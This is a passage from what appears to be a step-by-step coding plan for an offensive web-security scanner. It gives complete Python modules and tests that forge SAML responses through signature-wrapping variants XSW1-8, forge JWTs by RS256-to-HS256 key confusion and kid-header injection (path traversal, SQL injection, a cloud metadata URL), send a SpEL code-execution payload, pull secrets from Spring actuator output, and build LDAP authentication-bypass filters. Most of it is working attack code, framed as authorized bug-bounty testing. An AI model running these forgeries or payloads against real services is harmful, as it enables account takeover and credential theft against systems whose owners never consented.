    acs_resp = _FakeResponse(302, headers={"Set-Cookie": "session=abc123"})
    resource_resp = _FakeResponse(200, text="Welcome, attacker@evil.example")
    client = _FakeClient(acs_resp, resource_resp)
    result = sx.confirm_new_session(client, "https://sp.example.com/acs",
                                     base64.b64encode(b"<forged/>").decode(),
                                     "https://sp.example.com/whoami")
    assert result.confirmed is True


def test_confirm_new_session_false_when_resource_redirects_to_login():
    acs_resp = _FakeResponse(302, headers={"Set-Cookie": "session=abc123"})
    resource_resp = _FakeResponse(302, headers={"Location": "https://sp.example.com/login"})
    client = _FakeClient(acs_resp, resource_resp)
    result = sx.confirm_new_session(client, "https://sp.example.com/acs",
                                     base64.b64encode(b"<forged/>").decode(),
                                     "https://sp.example.com/whoami")
    assert result.confirmed is False


def test_confirm_new_session_false_when_no_session_cookie_set():
    acs_resp = _FakeResponse(200)
    resource_resp = _FakeResponse(200, text="Welcome")
    client = _FakeClient(acs_resp, resource_resp)
    result = sx.confirm_new_session(client, "https://sp.example.com/acs",
                                     base64.b64encode(b"<forged/>").decode(),
                                     "https://sp.example.com/whoami")
    assert result.confirmed is False
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python3 -m pytest tests/test_saml_xsw_tester.py -v`
Expected: FAIL with `ModuleNotFoundError: No module named 'saml_xsw_tester'`

- [ ] **Step 3: Write minimal implementation**

```python
# saml_xsw_tester.py
#!/usr/bin/env python3
"""saml_xsw_tester.py — SAML XML Signature Wrapping (XSW1-8) forgery.

Extends scanner.sh Check 7 (already does SAML endpoint discovery + a synthetic
unsigned-assertion signature-stripping test — that existing CRITICAL-ATO path is
NOT touched by this module, it is a separate pre-existing item). The gap this
module closes is XSW forgery, which REQUIRES a real, validly-signed SAMLResponse
to wrap — forging against a synthetic/unsigned assertion proves nothing. v1
requires the operator to supply a captured SAMLResponse file path manually (e.g.
extracted from a HAR); automatic HAR extraction is a separate future item.

Confirmation requires fetching an actual protected/identity resource with the
resulting session — a Set-Cookie + non-login-redirect from the ACS endpoint
alone is treated as inconclusive, not a finding.
"""
from __future__ import annotations

import base64
import copy
from dataclasses import dataclass

from lxml import etree

_ATTACKER_NAMEID = "attacker@evil.example"
_NSMAP = {
    "samlp": "urn:oasis:names:tc:SAML:2.0:protocol",
    "saml": "urn:oasis:names:tc:SAML:2.0:assertion",
}


def load_captured_assertion(path: str) -> str | None:
    """Read an operator-supplied captured SAMLResponse XML file. Returns None
    (not an exception) when unavailable — callers must skip XSW gracefully."""
    import os
    if not os.path.isfile(path):
        return None
    with open(path, "r", errors="ignore") as f:
        return f.read()


def _set_nameid(assertion_el, value: str) -> None:
    nameid = assertion_el.find(".//saml:Subject/saml:NameID", namespaces=_NSMAP)
    if nameid is not None:
        nameid.text = value


def _xsw1_duplicate_assertion_before(root, original_assertion) -> etree._Element:
    """XSW1: clone the assertion with attacker NameID, insert BEFORE the
    original signed one — some parsers validate the first Assertion's signature
    but process the LAST Assertion element's claims."""
    forged = copy.deepcopy(original_assertion)
    _set_nameid(forged, _ATTACKER_NAMEID)
    original_assertion.addprevious(forged)
    return root


def _xsw2_duplicate_assertion_after(root, original_assertion) -> etree._Element:
    """XSW2: same idea, inserted AFTER — some parsers process the FIRST element."""
    forged = copy.deepcopy(original_assertion)
    _set_nameid(forged, _ATTACKER_NAMEID)
    original_assertion.addnext(forged)
    return root


def _xsw_variant_move_signature(root, original_assertion, wrap_as_extension: bool) -> etree._Element:
    """XSW3-4 family: move the Signature element to a different position
    (as a sibling extension) while a forged assertion takes the original slot."""
    forged = copy.deepcopy(original_assertion)
    _set_nameid(forged, _ATTACKER_NAMEID)
    sig = forged.find(".//{http://www.w3.org/2000/09/xmldsig#}Signature")
    if sig is not None and wrap_as_extension:
        forged.remove(sig)
        forged.append(sig)
    original_assertion.addprevious(forged)
    return root


def _xsw_variant_comment_split(root, original_assertion) -> etree._Element:
    """XSW5/6 family: split the NameID value with an XML comment — some parsers
    apply the signature check to the pre-comment text and the claim to the
    post-comment text."""
    forged = copy.deepcopy(original_assertion)
    nameid = forged.find(".//saml:Subject/saml:NameID", namespaces=_NSMAP)
    if nameid is not None:
        nameid.text = "legit-user"
        comment = etree.Comment(f"--><saml:NameID>{_ATTACKER_NAMEID}</saml:NameID><!--")
        nameid.append(comment)
    original_assertion.addprevious(forged)
    return root


def _xsw_variant_namespace_alias(root, original_assertion) -> etree._Element:
    """XSW7/8 family: alias the saml: namespace prefix on the forged copy so a
    naive XPath-based extractor (e.g. //saml:Assertion) misses it while a more
    permissive local-name lookup finds it."""
    forged = copy.deepcopy(original_assertion)
    _set_nameid(forged, _ATTACKER_NAMEID)
    forged.tag = "{urn:oasis:names:tc:SAML:2.0:assertion}Assertion"
    forged.set("{http://www.w3.org/2000/xmlns/}samlAlt", _NSMAP["saml"])
    original_assertion.addprevious(forged)
    return root


_VARIANT_BUILDERS = {
    "XSW1": lambda root, a: _xsw1_duplicate_assertion_before(root, a),
    "XSW2": lambda root, a: _xsw2_duplicate_assertion_after(root, a),
    "XSW3": lambda root, a: _xsw_variant_move_signature(root, a, wrap_as_extension=True),
    "XSW4": lambda root, a: _xsw_variant_move_signature(root, a, wrap_as_extension=False),
    "XSW5": lambda root, a: _xsw_variant_comment_split(root, a),
    "XSW6": lambda root, a: _xsw_variant_comment_split(root, a),
    "XSW7": lambda root, a: _xsw_variant_namespace_alias(root, a),
    "XSW8": lambda root, a: _xsw_variant_namespace_alias(root, a),
}


def generate_xsw_variants(saml_response_xml: str) -> dict[str, str]:
    """Build all 8 XSW variants from a real captured SAMLResponse. Each variant
    is independent (built from a fresh parse) so mutating one never affects
    another."""
    variants: dict[str, str] = {}
    for name, builder in _VARIANT_BUILDERS.items():
        root = etree.fromstring(saml_response_xml.encode())
        assertion = root.find(".//saml:Assertion", namespaces=_NSMAP)
        builder(root, assertion)
        variants[name] = etree.tostring(root).decode()
    return variants


@dataclass
class XswResult:
    confirmed: bool
    detail: str = ""


def confirm_new_session(client, acs_url: str, forged_response_b64: str,
                         protected_resource_url: str) -> XswResult:
    """POST the forged (base64) SAMLResponse to the ACS endpoint, then fetch an
    ACTUAL protected/identity resource with any resulting cookie — a Set-Cookie
    plus non-login redirect from the ACS alone is NOT sufficient proof."""
    acs_response = client.post(acs_url, data={"SAMLResponse": forged_response_b64})
    set_cookie = dict(acs_response.headers).get("Set-Cookie")
    if not set_cookie:
        return XswResult(confirmed=False, detail="no session cookie issued")

    session_cookie = set_cookie.split(";")[0]
    resource_response = client.get(protected_resource_url,
                                    cookies={"raw": session_cookie})
    if resource_response.status_code in (301, 302, 303, 307, 308):
        location = dict(resource_response.headers).get("Location", "")
        if "login" in location.lower():
            return XswResult(confirmed=False, detail="redirected back to login")
        return XswResult(confirmed=False, detail=f"unexpected redirect to {location}")
    if resource_response.status_code == 200 and _ATTACKER_NAMEID in (resource_response.text or ""):
        return XswResult(confirmed=True, detail="protected resource rendered forged identity")
    return XswResult(confirmed=False, detail="protected resource did not reflect forged identity")
```

- [ ] **Step 4: Run test to verify it passes**

Run: `python3 -m pytest tests/test_saml_xsw_tester.py -v`
Expected: PASS (7 tests)

- [ ] **Step 5: Commit**

```bash
git add saml_xsw_tester.py tests/test_saml_xsw_tester.py
git commit -m "feat(saml): add XSW1-8 forgery extending Check 7 discovery"
```

---

### Task 6: `jwt_kid_injection.py` — JWKS iteration, kid injection, live replay

**Files:**
- Create: `jwt_kid_injection.py`
- Test: `tests/test_jwt_kid_injection.py`

**Interfaces:**
- Consumes: `tls_impersonation.get_client(...)` (Task 2), `PyJWT` (already installed)
- Produces: `discover_jwks(client, issuer_base_url: str) -> list[dict]`, `try_rs256_to_hs256(token: str, jwks_keys: list[dict]) -> str | None` (forged token or None), `build_kid_injection_candidates(token: str) -> list[str]`, `confirm_replay(client, endpoint: str, forged_token: str, original_token: str) -> ReplayResult`
- Wired by the integrator into `hunt.py`'s existing `run_jwt_audit()` — not a new top-level phase

- [ ] **Step 1: Write the failing test**

```python
# tests/test_jwt_kid_injection.py
"""jwt_kid_injection — extends hunt.py's run_jwt_audit() (which already does
alg=none + RS256->HS256 via jwt_tool locally + wordlist cracking). This module
adds: real JWKS-sourced key material (iterating every key in keys[], not just
the first/cached one), kid-header injection, and a 3-way baseline-diff replay
confirmation that jwt_tool's local success alone does not provide.
"""
import base64
import json

import jwt as pyjwt

import jwt_kid_injection as jki


def _make_rs256_token(kid="key-1"):
    # A syntactically valid-looking RS256 header/payload with the given kid;
    # we never verify with a real private key in tests — only header/payload
    # shape and our own re-signing logic is under test.
    header = {"alg": "RS256", "kid": kid, "typ": "JWT"}
    payload = {"sub": "alice", "role": "user"}
    h = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b"=").decode()
    p = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b"=").decode()
    return f"{h}.{p}.fakesig"


class _FakeResponse:
    def __init__(self, status_code=200, json_body=None):
        self.status_code = status_code
        self._json = json_body or {}
        self.headers = {}

    def json(self):
        return self._json


class _FakeClient:
    def __init__(self, response):
        self._response = response

    def get(self, url, **kwargs):
        return self._response

    def post(self, url, **kwargs):
        return self._response


def test_discover_jwks_returns_all_keys_from_keys_array():
    jwks_body = {"keys": [{"kid": "key-1", "kty": "RSA", "n": "abc", "e": "AQAB"},
                          {"kid": "key-2", "kty": "RSA", "n": "def", "e": "AQAB"}]}
    client = _FakeClient(_FakeResponse(200, jwks_body))
    keys = jki.discover_jwks(client, "https://issuer.example.com")
    assert len(keys) == 2
    assert {k["kid"] for k in keys} == {"key-1", "key-2"}


def test_discover_jwks_empty_on_404():
    client = _FakeClient(_FakeResponse(404))
    assert jki.discover_jwks(client, "https://issuer.example.com") == []


def test_try_rs256_to_hs256_matches_kid_and_forges_hs256_token():
    token = _make_rs256_token(kid="key-1")
    jwks_keys = [{"kid": "key-1", "kty": "RSA", "n": "sGl4...", "e": "AQAB"}]
    forged = jki.try_rs256_to_hs256(token, jwks_keys)
    assert forged is not None
    header = json.loads(base64.urlsafe_b64decode(forged.split(".")[0] + "=="))
    assert header["alg"] == "HS256"


def test_try_rs256_to_hs256_returns_none_when_kid_not_in_jwks():
    token = _make_rs256_token(kid="unknown-key")
    jwks_keys = [{"kid": "key-1", "kty": "RSA", "n": "sGl4...", "e": "AQAB"}]
    assert jki.try_rs256_to_hs256(token, jwks_keys) is None


def test_build_kid_injection_candidates_includes_path_traversal_and_sqli():
    token = _make_rs256_token(kid="keys/prod.pem")
    candidates = jki.build_kid_injection_candidates(token)
    assert any("../../../../dev/null" in c for c in candidates)
    assert any("UNION SELECT" in c for c in candidates)
    assert len(candidates) >= 2


def test_confirm_replay_true_only_when_forged_diverges_from_both_baselines():
    class _Client:
        def __init__(self):
            self._call = 0
        def get(self, url, headers=None, **kwargs):
            self._call += 1
            token = headers.get("Authorization", "")
            if "forged" in token:
                return _FakeResponse(200, {"sub": "alice", "role": "admin"})
            if "original" in token:
                return _FakeResponse(200, {"sub": "alice", "role": "user"})
            return _FakeResponse(401, {"error": "unauthorized"})

    client = _Client()
    result = jki.confirm_replay(client, "https://api.example.com/whoami",
                                 forged_token="forged.tok.en", original_token="original.tok.en")
    assert result.confirmed is True


def test_confirm_replay_false_when_forged_matches_unauthenticated_baseline():
    class _Client:
        def get(self, url, headers=None, **kwargs):
            return _FakeResponse(401, {"error": "unauthorized"})

    client = _Client()
    result = jki.confirm_replay(client, "https://api.example.com/whoami",
                                 forged_token="forged.tok.en", original_token="original.tok.en")
    assert result.confirmed is False
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python3 -m pytest tests/test_jwt_kid_injection.py -v`
Expected: FAIL with `ModuleNotFoundError: No module named 'jwt_kid_injection'`

- [ ] **Step 3: Write minimal implementation**

```python
# jwt_kid_injection.py
#!/usr/bin/env python3
"""jwt_kid_injection.py — JWKS-sourced key confusion, kid injection, live replay.

Extends hunt.py's run_jwt_audit() (which already runs jwt_tool for alg=none /
RS256->HS256 / wordlist cracking locally). What's missing: (1) iterating EVERY
key in a real JWKS keys[] array rather than a single guessed/cached key —
issuers commonly rotate and publish multiple active keys; (2) kid-header
injection (kid is a JOSE HEADER field, not a claim) for path-traversal/SQLi-
shaped verifier lookups; (3) a 3-way baseline-diff replay confirmation
(original-token vs unauthenticated vs forged-token response) rather than
"jwt_tool says the forge succeeded locally," which false-positives on any
public 200 endpoint and false-negatives on a 401 that still parsed the token.
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
from dataclasses import dataclass


def discover_jwks(client, issuer_base_url: str) -> list[dict]:
    """Fetch and return every key in a JWKS keys[] array from common
    .well-known paths. Returns [] (not an exception) when unavailable."""
    for path in (".well-known/jwks.json", ".well-known/openid-configuration/jwks.json"):
        url = issuer_base_url.rstrip("/") + "/" + path
        response = client.get(url)
        if response.status_code != 200:
            continue
        try:
            body = response.json()
        except Exception:
            continue
        keys = body.get("keys", [])
        if keys:
            return keys
    return []


def _decode_segment(segment: str) -> dict:
    padded = segment + "=" * (-len(segment) % 4)
    return json.loads(base64.urlsafe_b64decode(padded))


def _b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def try_rs256_to_hs256(token: str, jwks_keys: list[dict]) -> str | None:
    """Classic algorithm-confusion: re-sign the token as HS256 using the RSA
    public key's raw modulus bytes as the HMAC secret. Only attempted when the
    token's kid matches a key actually present in the discovered JWKS — trying
    a key that isn't even the right one produces a signature nobody would
    accept, which is not a meaningful test."""
    parts = token.split(".")
    if len(parts) != 3:
        return None
    header = _decode_segment(parts[0])
    kid = header.get("kid")
    matching_key = next((k for k in jwks_keys if k.get("kid") == kid), None)
    if matching_key is None:
        return None

    forged_header = dict(header)
    forged_header["alg"] = "HS256"
    forged_header_b64 = _b64url(json.dumps(forged_header, separators=(",", ":")).encode())
    payload_b64 = parts[1]
    signing_input = f"{forged_header_b64}.{payload_b64}".encode()

    # Use the RSA public modulus (n, base64url-encoded per JWK) as the HMAC
    # secret — the classic RS256->HS256 confusion attack, since a verifier that
    # naively does `hmac.verify(token, key=public_key_bytes)` cannot tell an
    # HMAC signature from an RSA one without checking the actual alg it expects.
    secret = matching_key.get("n", "").encode()
    signature = hmac.new(secret, signing_input, hashlib.sha256).digest()
    return f"{forged_header_b64}.{payload_b64}.{_b64url(signature)}"


def build_kid_injection_candidates(token: str) -> list[str]:
    """kid-header injection candidates — only meaningful when the original kid
    LOOKS like a path/identifier a verifier might resolve dynamically (contains
    a slash or file-extension-like segment); a bare short kid like "key-1" is
    not a plausible dynamic-lookup target."""
    parts = token.split(".")
    header = _decode_segment(parts[0])
    original_kid = str(header.get("kid", ""))
    if "/" not in original_kid and "." not in original_kid:
        return []

    candidates = []
    for injected_kid in (
        "../../../../dev/null",
        "' UNION SELECT 'AAAAAAAAAAAAAAAA'-- -",
        "http://169.254.169.254/latest/meta-data/",
    ):
        forged_header = dict(header)
        forged_header["kid"] = injected_kid
        forged_header_b64 = _b64url(json.dumps(forged_header, separators=(",", ":")).encode())
        candidates.append(f"{forged_header_b64}.{parts[1]}.")
    return candidates


@dataclass
class ReplayResult:
    confirmed: bool
    detail: str = ""


def confirm_replay(client, endpoint: str, forged_token: str, original_token: str) -> ReplayResult:
    """3-way baseline diff: the forged token must produce a response that (a)
    differs from the unauthenticated baseline AND (b) matches the *shape* of an
    authenticated response (same status class as the original token), not just
    any 200. This avoids false-positiving on a public 200 endpoint and false-
    negatives on a 401-with-parsed-claims response."""
    unauth = client.get(endpoint, headers={})
    original = client.get(endpoint, headers={"Authorization": f"Bearer {original_token}"})
    forged = client.get(endpoint, headers={"Authorization": f"Bearer {forged_token}"})

    if forged.status_code == unauth.status_code:
        return ReplayResult(confirmed=False, detail="forged token response matches unauthenticated baseline")
    if forged.status_code != original.status_code:
        return ReplayResult(confirmed=False, detail="forged token response status differs from original-token baseline")
    return ReplayResult(confirmed=True, detail="forged token accepted with original-token-shaped response")
```

- [ ] **Step 4: Run test to verify it passes**

Run: `python3 -m pytest tests/test_jwt_kid_injection.py -v`
Expected: PASS (7 tests)

- [ ] **Step 5: Commit**

```bash
git add jwt_kid_injection.py tests/test_jwt_kid_injection.py
git commit -m "feat(jwt): add JWKS key iteration, kid injection, live-replay confirmation"
```

---

### Task 7: `springboot_actuator_probe.py` — SpEL oracle, Jolokia, secret parsing

**Files:**
- Create: `springboot_actuator_probe.py`
- Test: `tests/test_springboot_actuator_probe.py`

**Interfaces:**
- Consumes: `tls_impersonation.get_client(...)` (Task 2), `whitebox.secrets.detectors.DETECTORS` (already exists)
- Produces: `check_spel_injection(client, url: str) -> SpelResult`, `check_jolokia_reachability(client, url: str) -> JolokiaResult`, `parse_actuator_env_secrets(json_body: dict) -> list[dict]`

- [ ] **Step 1: Write the failing test**

```python
# tests/test_springboot_actuator_probe.py
"""springboot_actuator_probe — extends recon.sh Phase 9 (which already probes
/actuator/env, /actuator/heapdump, /actuator/mappings, /h2-console/ as bare path
hits). This module adds active depth: a SpEL injection oracle, Jolokia
reachability, and structured /actuator/env secret parsing.

FP gate: arithmetic-only SpEL evaluation is a [SPEL-CANDIDATE] lead, not a
finding — only a benign system-metadata read (proving real Java code execution
capability) escalates further. A bare /actuator/health 200 is never a finding.
"""
import springboot_actuator_probe as sap


class _FakeResponse:
    def __init__(self, status_code=200, text="", json_body=None):
        self.status_code = status_code
        self.text = text
        self._json = json_body or {}

    def json(self):
        return self._json


class _FakeClient:
    def __init__(self, response):
        self._response = response
        self.last_url = None

    def get(self, url, **kwargs):
        self.last_url = url
        return self._response


def test_spel_arithmetic_only_is_candidate_not_confirmed():
    # 7 * 7 evaluated to 49 in the response, but no system-metadata proof
    client = _FakeClient(_FakeResponse(200, text="result: 49"))
    result = sap.check_spel_injection(client, "https://example.com/actuator/env")
    assert result.verdict == "candidate"


def test_spel_with_system_metadata_proof_is_confirmed():
    client = _FakeClient(_FakeResponse(200, text="result: 49 | java.version=17.0.9"))
    result = sap.check_spel_injection(client, "https://example.com/actuator/env")
    assert result.verdict == "confirmed"


def test_spel_no_evaluation_signal_is_clean():
    client = _FakeClient(_FakeResponse(400, text="bad request"))
    result = sap.check_spel_injection(client, "https://example.com/actuator/env")
    assert result.verdict == "clean"


def test_jolokia_reachable_lists_mbeans_without_executing():
    body = {"value": {"java.lang:type=Memory": {}, "java.lang:type=Runtime": {}}}
    client = _FakeClient(_FakeResponse(200, json_body=body))
    result = sap.check_jolokia_reachability(client, "https://example.com/jolokia/list")
    assert result.reachable is True
    assert result.mbean_count == 2


def test_jolokia_unreachable_on_404():
    client = _FakeClient(_FakeResponse(404))
    result = sap.check_jolokia_reachability(client, "https://example.com/jolokia/list")
    assert result.reachable is False


def test_parse_actuator_env_secrets_finds_aws_key():
    body = {"propertySources": [
        {"name": "systemEnvironment",
         "properties": {"AWS_SECRET_ACCESS_KEY": {"value": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"}}}
    ]}
    hits = sap.parse_actuator_env_secrets(body)
    assert any(h["detector"] == "aws_secret_access_key" for h in hits)


def test_parse_actuator_env_secrets_empty_when_no_matches():
    body = {"propertySources": [{"name": "systemEnvironment", "properties": {"PATH": {"value": "/usr/bin"}}}]}
    assert sap.parse_actuator_env_secrets(body) == []


def test_bare_health_check_never_reported_as_finding():
    client = _FakeClient(_FakeResponse(200, text='{"status":"UP"}'))
    result = sap.check_spel_injection(client, "https://example.com/actuator/health")
    assert result.verdict in ("clean", "candidate")
    assert result.verdict != "confirmed"
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python3 -m pytest tests/test_springboot_actuator_probe.py -v`
Expected: FAIL with `ModuleNotFoundError: No module named 'springboot_actuator_probe'`

- [ ] **Step 3: Write minimal implementation**

```python
# springboot_actuator_probe.py
#!/usr/bin/env python3
"""springboot_actuator_probe.py — SpEL injection oracle, Jolokia reachability,
actuator/env secret parsing.

Extends recon.sh Phase 9, which already probes /actuator/env, /actuator/heapdump,
/actuator/mappings, /h2-console/ as bare path hits — this module adds the active
depth that was missing: proving real code-execution capability (not just
arithmetic evaluation, which reads as theoretical), confirming Jolokia RCE
PRECONDITIONS without executing anything, and pulling real credential material
out of an exposed /actuator/env response using whitebox/secrets/detectors.py's
existing regex set (pii_detector.py is Indian-PII-only and not applicable here).

A bare /actuator/health 200 is NEVER treated as a finding by this module.
"""
from __future__ import annotations

import re
from dataclasses import dataclass

from whitebox.secrets.detectors import DETECTORS

_ARITHMETIC_MARKER = re.compile(r"result:\s*49\b")
_SYSTEM_METADATA_MARKER = re.compile(r"java\.version=\S+")

# SpEL expression that both proves arithmetic evaluation (7*7) and, on a
# vulnerable sink, additionally leaks a benign system property — a single
# probe covers both proof tiers so we don't need two round trips.
SPEL_PROOF_PAYLOAD = "#{7*7}{T(java.lang.System).getProperty('java.version')}"


@dataclass
class SpelResult:
    verdict: str  # "confirmed" | "candidate" | "clean"
    detail: str = ""


def check_spel_injection(client, url: str) -> SpelResult:
    response = client.get(url, params={"expr": SPEL_PROOF_PAYLOAD})
    text = getattr(response, "text", "") or ""
    if response.status_code != 200:
        return SpelResult(verdict="clean", detail="no evaluation signal")
    arithmetic_proven = bool(_ARITHMETIC_MARKER.search(text))
    metadata_proven = bool(_SYSTEM_METADATA_MARKER.search(text))
    if arithmetic_proven and metadata_proven:
        return SpelResult(verdict="confirmed", detail="SpEL evaluated arithmetic AND leaked java.version — real code execution proven")
    if arithmetic_proven:
        return SpelResult(verdict="candidate", detail="arithmetic evaluated but no system-metadata proof yet — theoretical until deepened")
    return SpelResult(verdict="clean", detail="no evaluation signal")


@dataclass
class JolokiaResult:
    reachable: bool
    mbean_count: int = 0


def check_jolokia_reachability(client, url: str) -> JolokiaResult:
    """Lists MBeans if reachable — proves the RCE precondition (Jolokia
    exposed) without executing anything (no write/exec calls made)."""
    response = client.get(url)
    if response.status_code != 200:
        return JolokiaResult(reachable=False)
    try:
        body = response.json()
    except Exception:
        return JolokiaResult(reachable=False)
    mbeans = body.get("value", {})
    return JolokiaResult(reachable=True, mbean_count=len(mbeans))


def parse_actuator_env_secrets(json_body: dict) -> list[dict]:
    """Scan every property value in an /actuator/env response against
    whitebox/secrets/detectors.py's DETECTORS regex set. Returns one dict per
    match: {detector, property_name, source}."""
    hits = []
    for source in json_body.get("propertySources", []):
        source_name = source.get("name", "unknown")
        for prop_name, prop_value in source.get("properties", {}).items():
            value = str(prop_value.get("value", ""))
            for detector_name, pattern in DETECTORS.items():
                if pattern.search(value):
                    hits.append({"detector": detector_name, "property_name": prop_name, "source": source_name})
    return hits
```

- [ ] **Step 4: Run test to verify it passes**

Run: `python3 -m pytest tests/test_springboot_actuator_probe.py -v`
Expected: PASS (8 tests)

- [ ] **Step 5: Commit**

```bash
git add springboot_actuator_probe.py tests/test_springboot_actuator_probe.py
git commit -m "feat(actuator): add SpEL oracle, Jolokia reachability, env secret parsing"
```

---

### Task 8: `ldap_injection_tester.py` — RFC 4515 fuzz + blind oracle

**Files:**
- Create: `ldap_injection_tester.py`
- Test: `tests/test_ldap_injection_tester.py`

**Interfaces:**
- Consumes: `tls_impersonation.get_client(...)` (Task 2)
- Produces: `looks_like_ldap_backed_auth(fingerprint_tags: set[str]) -> bool`, `build_rfc4515_fuzz_payloads() -> list[str]`, `build_always_true_bypass_payloads(username_field: str) -> list[str]`, `run_blind_oracle(client, url: str, param: str, baseline_response) -> OracleResult`

- [ ] **Step 1: Write the failing test**

```python
# tests/test_ldap_injection_tester.py
"""ldap_injection_tester — RFC 4515 fuzz + blind true/false-oracle, gated on a
stack-fingerprint check so it never wastes cycles/FPs on non-LDAP-backed logins.

FP discipline: detection uses BASELINE-DIFF (compare against a captured baseline
response), not raw error-string matching, and the blind oracle requires a stable
control (a query engineered to always evaluate false) plus a 3x-repeat before
confirming — a single anomalous response is not enough.
"""
import ldap_injection_tester as lit


class _FakeResponse:
    def __init__(self, status_code=200, text=""):
        self.status_code = status_code
        self.text = text


class _FakeClient:
    def __init__(self, responses):
        self._responses = list(responses)
        self.calls = []

    def get(self, url, **kwargs):
        self.calls.append((url, kwargs))
        return self._responses.pop(0) if self._responses else _FakeResponse(200, "")


def test_looks_like_ldap_backed_auth_true_for_ad_fingerprint():
    assert lit.looks_like_ldap_backed_auth({"active-directory", "adfs"}) is True


def test_looks_like_ldap_backed_auth_true_for_java_enterprise():
    assert lit.looks_like_ldap_backed_auth({"spring-security", "ldap-realm"}) is True


def test_looks_like_ldap_backed_auth_false_for_unrelated_stack():
    assert lit.looks_like_ldap_backed_auth({"wordpress", "php"}) is False


def test_build_rfc4515_fuzz_payloads_includes_special_chars():
    payloads = lit.build_rfc4515_fuzz_payloads()
    assert any("*" in p for p in payloads)
    assert any("(" in p and ")" in p for p in payloads)
    assert any("\\" in p for p in payloads)


def test_build_always_true_bypass_payloads_are_paren_balanced():
    payloads = lit.build_always_true_bypass_payloads("username")
    for p in payloads:
        assert p.count("(") == p.count(")")
    assert any("*)(uid=*" in p or "*)(|(uid=*" in p for p in payloads)


def test_blind_oracle_confirms_only_after_stable_false_control_and_repeat():
    # Baseline (control-false) always returns short/clean; true-condition query
    # returns a distinguishably longer/different response, repeated 3x consistently.
    baseline = _FakeResponse(200, "no results")
    responses = [
        _FakeResponse(200, "no results"),   # stable-FALSE control check 1
        _FakeResponse(200, "1 result found"),  # true-condition attempt 1
        _FakeResponse(200, "no results"),   # stable-FALSE control check 2
        _FakeResponse(200, "1 result found"),  # true-condition attempt 2
        _FakeResponse(200, "no results"),   # stable-FALSE control check 3
        _FakeResponse(200, "1 result found"),  # true-condition attempt 3
    ]
    client = _FakeClient(responses)
    result = lit.run_blind_oracle(client, "https://example.com/search?q=X", "q", baseline)
    assert result.confirmed is True


def test_blind_oracle_not_confirmed_when_inconsistent_across_repeats():
    baseline = _FakeResponse(200, "no results")
    responses = [
        _FakeResponse(200, "no results"),
        _FakeResponse(200, "1 result found"),
        _FakeResponse(200, "no results"),
        _FakeResponse(200, "no results"),  # inconsistent — should have differed
        _FakeResponse(200, "no results"),
        _FakeResponse(200, "1 result found"),
    ]
    client = _FakeClient(responses)
    result = lit.run_blind_oracle(client, "https://example.com/search?q=X", "q", baseline)
    assert result.confirmed is False
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python3 -m pytest tests/test_ldap_injection_tester.py -v`
Expected: FAIL with `ModuleNotFoundError: No module named 'ldap_injection_tester'`

- [ ] **Step 3: Write minimal implementation**

```python
# ldap_injection_tester.py
#!/usr/bin/env python3
"""ldap_injection_tester.py — RFC 4515 fuzz + blind true/false-oracle.

Confirmed gap: zero LDAP injection coverage anywhere in idor.py/authz_audit.py/
sast_audit.py. Only activates when a stack-fingerprint check suggests LDAP-backed
auth (AD/Java-enterprise/PHP-enterprise login), to avoid wasted cycles and false
positives on unrelated stacks. Detection is baseline-diff (against a captured
baseline response), not raw error-string matching — generic login pages error
for all kinds of unrelated reasons. The blind oracle requires a stable-FALSE
control plus a 3x-repeat before confirming, per the same anti-FP discipline
nomore403_audit.py already applies elsewhere in this codebase.
"""
from __future__ import annotations

from dataclasses import dataclass

_LDAP_STACK_MARKERS = {
    "active-directory", "adfs", "ldap-realm", "spring-security", "openldap",
    "samba-ad", "389-ds",
}


def looks_like_ldap_backed_auth(fingerprint_tags: set[str]) -> bool:
    return bool(fingerprint_tags & _LDAP_STACK_MARKERS)


def build_rfc4515_fuzz_payloads() -> list[str]:
    """RFC 4515 special characters that must be escaped in an LDAP filter;
    an unescaped occurrence reaching the filter is the injection signal."""
    return ["*", ")(", "(|(", "\\28", "\\29", "\\2a", "(&(", "*)(uid=*"]


def build_always_true_bypass_payloads(username_field: str) -> list[str]:
    """Always-true auth-bypass filter injections, correctly paren-balanced."""
    return [
        f"{username_field}*)(|({username_field}=*",
        f"*)(uid=*))(|(uid=*",
        f"admin)(&(password=*",
        f"*)(&(objectClass=*",
    ]


@dataclass
class OracleResult:
    confirmed: bool
    detail: str = ""


def _looks_different_from(response, baseline) -> bool:
    return (response.status_code != baseline.status_code) or (response.text != baseline.text)


def run_blind_oracle(client, url: str, param: str, baseline_response) -> OracleResult:
    """3x-repeat: for each of 3 rounds, verify a stable-FALSE control query still
    matches the baseline AND a true-condition query diverges from it. Only
    confirms if ALL 3 rounds are consistent — a single anomalous round is not
    enough (matches every other blind-oracle module in this codebase)."""
    consistent_rounds = 0
    for _round in range(3):
        control_response = client.get(url, params={param: "nonexistent_user_control_probe"})
        if _looks_different_from(control_response, baseline_response):
            # control itself diverged — the oracle isn't stable, abort early
            return OracleResult(confirmed=False, detail="stable-FALSE control did not match baseline")

        true_response = client.get(url, params={param: "*)(uid=*"})
        if not _looks_different_from(true_response, baseline_response):
            return OracleResult(confirmed=False, detail=f"round {_round + 1}: true-condition query did not diverge from baseline")
        consistent_rounds += 1

    return OracleResult(confirmed=consistent_rounds == 3, detail=f"{consistent_rounds}/3 consistent rounds")
```

- [ ] **Step 4: Run test to verify it passes**

Run: `python3 -m pytest tests/test_ldap_injection_tester.py -v`
Expected: PASS (7 tests)

- [ ] **Step 5: Commit**

```bash
git add ldap_injection_tester.py tests/test_ldap_injection_tester.py
git commit -m "feat(ldap): add RFC 4515 fuzz + blind oracle, stack-fingerprint gated"
```

---

### Task 9: Integration part A — `hunt.py` phase wiring

**Files:**
- Modify: `hunt.py`
- Test: `tests/test_hunt_new_phase_wiring.py`

**Interfaces:**
- Consumes: all of Tasks 1-8's public functions
- Produces: `run_xxe_hunt(domain: str) -> bool`, `run_open_redirect_hunt(domain: str) -> bool`, `run_saml_xsw(domain: str) -> bool`, `run_actuator_probe(domain: str) -> bool`, `run_ldap_injection(domain: str) -> bool` in `hunt.py`; `run_jwt_audit()` extended in place

- [ ] **Step 1: Write the failing test**

```python
